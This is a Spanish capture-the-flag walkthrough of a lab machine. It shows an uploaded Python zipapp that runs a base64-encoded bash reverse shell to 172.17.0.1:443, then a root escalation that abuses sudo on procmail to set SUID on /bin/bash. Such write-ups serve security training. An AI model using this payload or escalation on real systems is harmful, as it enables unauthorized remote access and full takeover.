nmap:80

![image](https://github.com/user-attachments/assets/6da55b66-44e5-45aa-b6bd-204f3656c0a3)


---
al ingresar a la pagina principal vemos esto

![image](https://github.com/user-attachments/assets/3924a298-cd07-4d62-a48b-c0491a3129b3)

entramos a "chat Right now" y es un .dl así que lo añadimos a "/etc/host" 

al entrar nos mandara a un tipo chat que hay

![image](https://github.com/user-attachments/assets/fa5ddaa2-dc0d-4b43-a35e-4a977eb12627)


con burpsuite capturamos y vemos que los archivos se suben en formato "PYZ"
en el terminal creo un virus.pyz:

    import os
    os.system("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYx' | base64 -d | bash")

en la pagina https://www.revshells.com/ creamos una reverse en base64 y nos dara algo así: YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYx que será lo que colocaremos en el código 

lo guardamos, colocamos el terminal en escucha y subimos el archivo
esperamos un rato y estamos dentro ahora escalamos
después de esperar un rato tenemos al conexión

![image](https://github.com/user-attachments/assets/6a6eb0ab-ff4a-4779-8a46-521a44c1e07a)

al hacer un sudo -l aparece: /usr/bin/procmail

![image](https://github.com/user-attachments/assets/db26a903-36f3-4593-a894-88fd0d403f01)


en la carpeta /tmp hay un archivo llamado "crontab.z4q2tt" que podemos modificar 
como no hay una carpeta de procmail creamos una llamada "procmailrc",  dentro colocamos el código: 

     TMPFILE="/tmp/pwned"
     :0
	 | touch $TMPFILE

![image](https://github.com/user-attachments/assets/bbb826f0-fd6a-4090-bc9c-8e9d19ac7c36)


ahora probamos que el código funciona utilizando este comando

	 echo "test" | sudo /usr/bin/procmail -m .procmailrc

![image](https://github.com/user-attachments/assets/b1ed3ffa-2170-4e85-b29d-bfceddf9e825)


ahora colocamos el mismo comando pero lo modificamos 

     TMPFILE="/tmp/pwned"
     :0
	 | touch $TMPFILE; chmod u+s /bin/bash

![image](https://github.com/user-attachments/assets/6785be7e-9982-4348-b33d-ba883b79815c)


volvemos a lanzar el comando:

     echo "test" | sudo /usr/bin/procmail -m .procmailrc

revisamos con "ls -la" el archivo en especifico de /bin/bash  y vemos que esta en rojo como queríamos con los permisos, ahora lanzamos un "bash -p"

![image](https://github.com/user-attachments/assets/52a093bb-99a6-4528-9649-04bf97f23556)

y somos root!